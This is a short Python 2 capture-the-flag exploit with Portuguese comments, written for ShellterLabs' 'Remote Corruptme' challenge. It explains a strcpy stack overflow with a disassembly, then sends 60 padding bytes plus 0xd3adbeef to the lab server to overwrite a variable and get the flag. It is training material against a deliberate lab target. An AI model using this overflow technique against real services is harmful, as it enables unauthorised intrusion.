'''
Exploit para o desafio Remote Corruptme da ShellterLabs
-------------------------------------------------------
O exploit causa um Buffer Overflow no programa 'rop_remote',
sobreescrevendo o valor de var1 com uma constante esperada,
validando a comparacao e revelando a flag.

No disassemble da funcao main() podemos ver uma comparacao
de var1 com o valor 0xd3adbeef.

gdb$ disassmble main
   ...
   0x8048660 <main+229>:  call   0x8048410 <strcpy@plt>   ;entrada copiada para o buffer
   0x8048665 <main+234>:  add    esp,0x10
   0x8048668 <main+237>:  mov    eax,DWORD PTR [ebp-0x2c] ;aki o conteudo de var1 eh enviada para $eax
=> 0x804866b <main+240>:  cmp    eax,0xd3adbeef           ;compara a variavel com a constante 0xd3adbeef
   0x8048670 <main+245>:  jne    0x804872c <main+433>
   0x8048676 <main+251>:  sub    esp,0xc
   0x8048679 <main+254>:  lea    eax,[ebx-0x17db]
   0x804867f <main+260>:  push   eax
   ...

Resumindo:
1. O programa recebe uma entrada do usuario e a copia para um buffer
2. Compara var1 com 0xd3adbeef
3. Se var1 = 0xd3adbeef, revela a flag
4. Se var1 conter outro valor nao retorna a flag


Ivan S. Vargas
22/11/2017
'''
import socket

SERVER = "lab.shellterlabs.com"
PORT = 33541

val_comp = "\xef\xbe\xad\xd3"
payload = "A" * 60 + val_comp

print "[+] Conectando ao servidor..."
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))

print "[+] Enviando payload..."
sock.send(payload+"\n\r")
r = sock.recv(1024)

print "[*] Retorno: %s" % r


